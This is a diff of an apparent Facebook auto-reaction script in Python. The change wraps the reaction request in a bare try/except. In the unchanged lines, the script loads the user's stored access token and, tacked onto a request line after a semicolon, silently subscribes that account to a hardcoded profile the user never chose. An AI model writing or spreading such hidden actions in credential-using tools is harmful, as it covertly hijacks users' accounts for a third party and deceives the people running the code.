@@ -21,11 +21,13 @@ try:
       except KeyError: pass
 
     def react(self,id,act):
-      par={'access_token':res,'type':act}
-      reeq=requests.post('https://graph.facebook.com/v3.2/'+id+'/reactions',data=par)
-      if 'success' in str(reeq.text):
-        print("[+] post id - "+id+" [success]")
-      else: print("[-] post id - "+id+" [failed]")
+      try:
+        par={'access_token':res,'type':act}
+        reeq=requests.post('https://graph.facebook.com/v3.2/'+id+'/reactions',data=par)
+        if 'success' in str(reeq.text):
+          print("[+] post id - "+id+" [success]")
+        else: print("[-] post id - "+id+" [failed]")
+      except: pass
 
   ket=open('toket/token.txt','r').read()
   req=requests.get('https://graph.facebook.com/v3.0/me?fields=feed.limit(10)&access_token='+ket);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+ket)
